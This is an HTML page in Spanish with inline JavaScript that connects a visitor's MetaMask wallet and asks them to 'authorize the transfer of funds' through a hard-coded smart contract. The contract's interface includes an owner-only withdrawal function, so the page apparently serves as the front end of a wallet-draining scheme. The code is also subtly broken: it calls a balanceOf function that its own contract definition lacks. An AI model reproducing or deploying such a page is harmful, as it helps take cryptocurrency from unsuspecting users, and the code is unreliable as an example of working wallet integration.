<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Conectar a Metamask</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js" integrity="sha384-LgD6YYy8zJhHcdnc1ucbFkDlQ2hPe11ft9XvYpHaBkjnw+WTf/gwzG+i5Rl/dPz" crossorigin="anonymous"></script>
    <script type="text/javascript">
        const contractAddress = "0x385C413138A50aabF895dC0855e0f85448dC6838";
        const abi = [{"inputs":[{"internalType":"address","name":"_direccionComun","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"depositante","type":"address"},{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosDepositados","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosRetirados","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"aprobaciones","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"aprobarPermisos","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"direccionComun","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retirarFondos","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(contractAddress, abi, signer);

        async function conectarMetamask() {
            await window.ethereum.enable();
            const accounts = await provider.listAccounts();
            const address = accounts[0];
            const balanceBNB = await provider.getBalance(address);
            const balanceTokens = await contract.balanceOf(address);

            // Añadir código para actualizar la card con el saldo del usuario

            console.log("Usuario conectado:", address);
            console.log("Saldo en BNB:", ethers.utils.formatEther(balanceBNB));
            console.log("Saldo en tokens:", ethers.utils.formatUnits(balanceTokens, 18));
        }

        async function aprobarPermisos() {
            try {
                const tx = await contract.aprobarPermisos();
                await tx.wait();
                console.log("Permisos aprobados");
            } catch (error) {
                console.error("Error al aprobar permisos:", error);
            }
        }
    </script>
</head>
<body>
    <div class="card">
        <div class="card-body">
            <h5 class="card-title">Conectar a Metamask</h5>
            <p class="card-text">Haz clic en el botón para conectar a Metamask y autorizar la transferencia de fondos</p>
            <button class="btn btn-primary" onclick="conectarMetamask()">Conectar a Metamask</button>
            <button class="btn btn-secondary" onclick="aprobarPermisos()">Autorizar transferencia</button>
        </div>
    </div>
</body>
</html>
